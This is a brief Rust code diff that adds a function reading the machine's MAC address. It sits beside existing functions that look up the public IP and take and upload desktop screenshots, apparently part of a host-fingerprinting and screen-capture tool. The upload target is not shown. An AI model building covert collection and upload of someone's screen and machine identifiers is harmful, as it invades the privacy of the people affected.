@@ -1,3 +1,4 @@
+use mac_address::get_mac_address;
 use reqwest::multipart;
 use screenshots::Screen;
 use std::ffi::OsString;
@@ -15,6 +16,15 @@ pub async fn get_ip() -> Result<String, Box<dyn std::error::Error>> {
     let resp = client.get("https://api.ipify.org").send().await?;
     let text = resp.text().await?;
     Ok(text.trim().to_string())
+}
+
+pub fn get_mac() -> String {
+    if let Ok(Some(mac)) = get_mac_address() {
+        let mac_string: String = mac.to_string();
+        return mac_string;
+    } else {
+        return "Failed to get MAC address".to_string();
+    }
 }
 
 pub async fn screenshot_desktop_and_upload() -> Result<Vec<String>, Box<dyn std::error::Error>> {
